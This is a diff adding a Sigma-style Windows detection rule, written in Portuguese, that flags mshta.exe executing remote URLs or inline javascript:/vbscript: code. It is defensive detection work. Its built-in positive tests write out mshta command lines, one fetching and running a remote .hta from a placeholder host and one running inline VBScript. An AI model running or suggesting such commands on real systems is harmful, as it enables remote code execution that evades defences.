@@ -1,0 +1,32 @@
+title: 'Mshta executando conteúdo remoto ou em linha'
+id: '0dd7f8b3-6147-575d-9138-6b04fd647777'
+status: 'stable'
+description: 'O mshta executa aplicações HTML e aceita URLs e código em linha: uma forma de rodar código sem arquivo no disco.'
+references:
+    - 'https://attack.mitre.org/techniques/T1218/005/'
+author: 'RuleForge (regras de exemplo)'
+date: '2026/10/23'
+tags:
+    - 'attack.stealth'
+    - 'attack.t1218.005'
+logsource:
+    category: 'process_creation'
+    product: 'windows'
+detection:
+    selection:
+        Image|endswith: '\mshta.exe'
+        CommandLine|contains:
+            - 'http://'
+            - 'https://'
+            - 'javascript:'
+            - 'vbscript:'
+    condition: 'selection'
+falsepositives:
+    - 'Aplicações legadas que usam arquivos .hta locais (não casam, pois não têm URL)'
+level: 'high'
+x_tests:
+    positive:
+        - {Image: 'C:\Windows\System32\mshta.exe', CommandLine: 'mshta.exe https://exemplo.invalid/a.hta'}
+        - {Image: 'C:\Windows\System32\mshta.exe', CommandLine: 'mshta vbscript:Execute("x")'}
+    negative:
+        - {Image: 'C:\Windows\System32\mshta.exe', CommandLine: 'mshta.exe C:\apps\legado.hta'}
